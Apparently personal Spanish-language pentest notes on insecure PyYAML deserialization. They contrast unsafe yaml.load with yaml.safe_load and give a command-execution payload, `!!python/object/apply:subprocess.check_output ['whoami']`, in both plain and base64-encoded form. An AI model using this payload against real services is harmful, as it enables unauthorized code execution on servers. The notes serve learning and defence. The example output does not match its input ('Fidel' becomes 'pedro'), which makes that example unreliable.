Yaml es un modulo de python que se encarga en serializar objetos y darles forma digamos, siempre orientado a que Python lo pueda leer. 

Por ejemplo, si yo le paso un archivo con el siguiente contenido:

```hola.txt
nombre: Fidel
edad: 18
```

Yaml lo convierte en la siguiente cadena:

```yaml
{'nombre': 'pedro', 'edad': 18}
```

---
El siguiente recurso tiene info piola:
https://www.pkmurphy.com.au/isityaml/

---
---
eWFtbDogImNvbnRlbnRzX29mX2N3ZCI6ICEhcHl0aG9uL29iamVjdC9hcHBseTpzdWJwcm9jZXNz
LmNoZWNrX291dHB1dCBbJ3dob2FtaSddCg==

---
Si vemos que se esta serializando un objeto yaml y el codigo (que no sabemos pero igual aclaro) es algo asi:

```
data = yaml.load(yaml_text, Loader=yaml.FullLoader)
```

Carga el contenido con yaml.load (inseguro hoy en dia), lo seguro es hacerlo con _yaml.safe_load_:

```python
import yaml
data = yaml.safe_load(yaml_text)
```
---
Una vez tenemos el objeto serializado, _deberia verse algo asi_:

```
eWFtbDogVGhlIGluZm9ybWF0aW9uIHBhZ2UgaXMgc3RpbGwgdW5kZXIgY29uc3RydWN0aW9uLCB1cGRhdGVzIGNvbWluZyBzb29uIQ==
```
=
```yaml
yaml: The information page is still under construction, updates coming soon!
```

podemos intentar inyectar el siguiente payload (q esta en el recurso adjunto mas arriba):

```yaml
yaml: "contents_of_cwd": !!python/object/apply:subprocess.check_output ['whoami']
```

